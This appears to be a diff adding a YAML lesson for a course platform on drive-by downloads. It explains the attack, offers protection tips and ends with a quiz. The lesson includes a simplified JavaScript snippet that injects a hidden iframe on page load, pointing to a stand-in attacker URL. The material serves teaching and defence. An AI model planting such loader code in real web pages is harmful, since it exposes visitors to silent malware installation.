@@ -1,0 +1,92 @@
+# yaml-language-server: $schema=https://vscodeedu.com/assets/schema/course-v2.schema.json
+id: lessonpart5
+title: Drive By Downloads
+content: >
+  ### Understanding Drive-By Downloads
+
+
+  Drive-by downloads are a common method used by cybercriminals to install
+  malicious software on a user's computer without their knowledge. This can
+  happen when a user visits a compromised or malicious website. Let's explore
+  how drive-by downloads work and how to protect against them.
+
+
+  #### How Drive-By Downloads Work
+
+
+  1. **Visit a Malicious Website**: The user visits a website that has been
+  compromised or is intentionally malicious.
+
+  2. **Exploit Vulnerabilities**: The website contains code that exploits
+  vulnerabilities in the user's browser or plugins.
+
+  3. **Automatic Download**: Malicious software is downloaded and installed on
+  the user's device without their consent.
+
+
+  #### Example Code: Malicious JavaScript
+
+
+  Below is a simplified example of how JavaScript might be used in a drive-by
+  download attack. This code attempts to exploit a vulnerability in the user's
+  browser to download a file.
+
+
+  ```javascript
+
+  // Example of malicious JavaScript
+
+  function exploitVulnerability() {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'http://malicious-site.com/exploit';
+      document.body.appendChild(iframe);
+  }
+
+
+  window.onload = function() {
+      exploitVulnerability();
+  };
+
+  ```
+
+
+  In this example, an invisible iframe is created and added to the page. The
+  iframe's source points to a malicious site that could exploit a vulnerability.
+
+
+  #### Protecting Against Drive-By Downloads
+
+
+  - **Keep Software Updated**: Regularly update your browser and plugins to
+  patch vulnerabilities.
+
+  - **Use Security Software**: Install and maintain reputable antivirus and
+  anti-malware software.
+
+  - **Be Cautious Online**: Avoid clicking on suspicious links or visiting
+  untrusted websites.
+
+
+  By understanding how drive-by downloads work and taking preventive measures,
+  users can protect themselves from these types of cyber threats.
+questionGroups:
+  - id: "1"
+    questions:
+      - id: "1"
+        type: multiple
+        content: What is a drive-by download?
+        options:
+          - id: "1"
+            value: A method used by cybercriminals to install malicious software on a user's
+              computer without their knowledge.
+            explanation: This is the correct definition of a drive-by download.
+            isCorrect: true
+          - id: "2"
+            value: A technique for downloading large files quickly from trusted websites.
+            explanation: Drive-by downloads are not related to downloading large files
+              quickly.
+          - id: "3"
+            value: A process of updating software automatically to the latest version.
+            explanation: Drive-by downloads involve installing malicious software, not
+              updating software.
